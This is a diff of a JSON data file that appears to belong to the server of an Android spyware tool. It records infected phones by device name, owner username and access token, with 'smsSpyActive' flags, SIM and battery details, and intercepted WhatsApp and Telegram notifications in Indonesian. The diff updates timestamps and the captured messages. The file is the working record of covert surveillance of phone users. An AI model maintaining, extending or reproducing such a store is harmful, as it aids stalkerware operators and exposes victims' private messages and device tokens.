@@ -3031,7 +3031,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "cf99cabf9358fc617b7c22cc76eb4cb3",
-    "lastSeen": 1776753331283,
+    "lastSeen": 1776753349277,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-20T19:20:24.863Z",
@@ -3080,14 +3080,14 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "3b9b91fe42c928810228c2889719201c",
-    "lastSeen": 1776753333513,
+    "lastSeen": 1776753348665,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T04:18:12.057Z",
     "deviceInfo": {
       "model": "realme RMX2103",
       "androidVersion": "Android 11",
-      "battery": 32,
+      "battery": 28,
       "network": "WiFi: <unknown ssid>",
       "sim1": "XL Axiata",
       "sim2": "Tidak ada layanan"
@@ -3102,6 +3102,14 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 13:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776753349370
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -7093,14 +7101,6 @@
         "time": "21/04 12:05",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776747902200
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 12:05",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776747902104
       }
     ],
     "galleryPhotos": [
